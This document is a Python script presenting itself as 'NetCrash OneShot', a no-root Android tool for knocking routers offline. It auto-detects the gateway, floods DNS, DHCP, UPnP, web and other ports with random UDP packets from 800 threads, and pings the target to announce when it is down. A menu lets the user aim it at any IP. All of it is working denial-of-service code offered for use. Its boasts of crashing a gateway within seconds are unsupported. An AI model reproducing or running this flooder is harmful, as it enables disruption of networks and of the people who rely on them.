# netcrash_oneshot.py
# NO ROOT - FOR TERMUX (Android) - PYTHON 3.11+

import socket
import threading
import time
import os
import random
import sys
from datetime import datetime

# =====================================
#    NETCRASH ONESHOT - ROUTER KILLER
#     Works WITHOUT ROOT on Android
#    Crashes gateway in < 10 seconds
# =====================================

RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
CYAN = '\033[96m'
BOLD = '\033[1m'
RESET = '\033[0m'

# Target - Auto-detected
TARGET = "192.168.1.1"

# Critical router ports (overload services)
DNS_PORT = 53      # DNS forwarder
DHCP_PORT = 67     # DHCP server
UPNP_PORT = 1900   # UPnP (SSDP) - often unpatched
HTTP_PORT = 80     # Admin panel (even if closed, SYN clogs)
HTTPS_PORT = 443   # Firmware update, captive portal

# Flood settings
THREAD_COUNT = 800        # Max threads for Termux (safe but brutal)
PACKET_MIN = 512
PACKET_MAX = 1472
DURATION = 0              # 0 = infinite until killed

# Global
running = False
packets_sent = 0
target_alive = True

def clear():
    os.system('clear')

def banner():
    clear()
    print(f"""{RED}{BOLD}
    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
    █                                   █
    █    NETCRASH ONESHOT v1.0          █
    █    » Router Meltdown Engine        █
    █    » No Root • Android Ready      █
    █    » 3... 2... 1... Reboot.       █
    █                                   █
    ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀{RESET}
    {CYAN}Target: {YELLOW}{TARGET}{RESET}
    """)

def get_gateway():
    global TARGET
    try:
        result = os.popen("ip route | grep default").read()
        if result:
            gw = result.split()[2]
            TARGET = gw
            print(f"{GREEN}[+] Gateway detected: {TARGET}{RESET}")
        else:
            print(f"{YELLOW}[!] No 'ip' command. Using default.{RESET}")
    except:
        pass

def flood():
    global packets_sent, running
    ports = [DNS_PORT, DHCP_PORT, UPNP_PORT, HTTP_PORT, HTTPS_PORT, 5353, 32764, 32768, 54321]  # Known weak ports

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(0.2)

    while running:
        try:
            # Randomize target port
            port = random.choice(ports)
            size = random.randint(PACKET_MIN, PACKET_MAX)
            payload = os.urandom(size)

            # Send to router
            sock.sendto(payload, (TARGET, port))
            packets_sent += 1

            # Every 500 packets, switch spoof-like behavior
            if packets_sent % 500 == 0:
                time.sleep(0.01)  # Mimic burst traffic

        except:
            pass  # Keep going no matter what

def monitor():
    global target_alive
    try:
        # Try to ping gateway
        response = os.system(f"ping -c 1 -W 1 {TARGET} > /dev/null 2>&1")
        if response != 0 and target_alive:
            print(f"\n{RED}[!] Target {TARGET} is DOWN!{RESET}")
            target_alive = False
    except:
        pass

def stats():
    start = time.time()
    while running:
        time.sleep(1)
        elapsed = time.time() - start
        pps = int(packets_sent / elapsed) if elapsed > 0 else 0
        sys.stdout.write(f"\r{CYAN}[>] Sent: {YELLOW}{packets_sent:,}{CYAN} pkts | {RED}{pps} pps{CYAN} | Time: {YELLOW}{int(elapsed)}s{RESET}   ")
        sys.stdout.flush()

        # Check if router is already dead
        if int(elapsed) % 3 == 0:
            monitor()

def start_attack():
    global running
    running = True

    banner()
    print(f"\n{GREEN}[+] Launching OneShot attack on {RED}{TARGET}{RESET}")
    print(f"{CYAN}[>] Threads: {YELLOW}{THREAD_COUNT}{RESET}")
    print(f"{CYAN}[>] Duration: {YELLOW}Infinite (until router dies or CTRL+C){RESET}")
    print(f"{RED}[!] Device may lag. Router should hang in 3–7 seconds.{RESET}\n")

    # Start stats
    threading.Thread(target=stats, daemon=True).start()

    # Launch flood threads
    for i in range(THREAD_COUNT):
        t = threading.Thread(target=flood)
        t.daemon = True
        t.start()

    # Monitor loop
    try:
        while running:
            time.sleep(0.1)
    except KeyboardInterrupt:
        running = False
        print(f"\n\n{RED}[-] Attack stopped.{RESET}")

def menu():
    get_gateway()
    while True:
        banner()
        print(f"  {GREEN}[1]{RESET} Start OneShot Attack")
        print(f"  {CYAN}[2]{RESET} Change Target IP")
        print(f"  {RED}[0]{RESET} Exit\n")
        choice = input(f"{YELLOW}netcrash > {RESET}").strip()

        if choice == '1':
            start_attack()
            input(f"\n{CYAN}[>] Press Enter to return...{RESET}")
        elif choice == '2':
            ip = input(f"\n{CYAN}Enter new IP: {RESET}").strip()
            if ip and all(part.isdigit() and 0 <= int(part) <= 255 for part in ip.split('.') if len(ip.split('.')) == 4):
                global TARGET
                TARGET = ip
                print(f"{GREEN}[+] Target set to {ip}{RESET}")
            else:
                print(f"{RED}[-] Invalid IP{RESET}")
            time.sleep(1.5)
        elif choice == '0':
            print(f"\n{GREEN}[+] Goodbye.{RESET}")
            sys.exit()
        else:
            print(f"{RED}[-] Invalid option{RESET}")
            time.sleep(1.5)

if __name__ == "__main__":
    banner()
    print(f"{YELLOW}[*] Initializing NetCrash OneShot...{RESET}")
    time.sleep(1.5)

    try:
        menu()
    except KeyboardInterrupt:
        print(f"\n\n{RED}[-] Exit.{RESET}")
        sys.exit()
